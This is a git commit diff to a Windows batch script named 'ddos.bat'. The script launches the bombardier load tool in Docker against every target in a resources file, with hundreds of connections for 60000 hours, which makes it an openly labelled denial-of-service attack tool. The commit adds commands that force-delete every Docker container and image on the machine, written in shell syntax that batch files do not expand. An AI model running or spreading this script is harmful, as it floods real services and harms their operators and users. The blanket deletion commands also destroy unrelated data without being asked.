97757bf6c4cc5b34c16587ebbe958b649bbeb463
koterion <koterion317@gmail.com>
2022-02-27 10:22:52 +0200

    Add docker restart for windows

--- ddos.bat
+++ ddos.bat
@@ -1,5 +1,9 @@
 @echo off
 set arg1=%1
+
+docker rm -f $(docker ps -a -q)
+docker rmi -f $(docker images -q)
+
 for /f "tokens=*" %%s in (resources.txt) do (
 	if (%arg1% == '') docker run -d --rm alpine/bombardier -c 300 -d 60000h -l %%s
   else docker run -d --rm alpine/bombardier -c %arg1% -d 60000h -l %%s
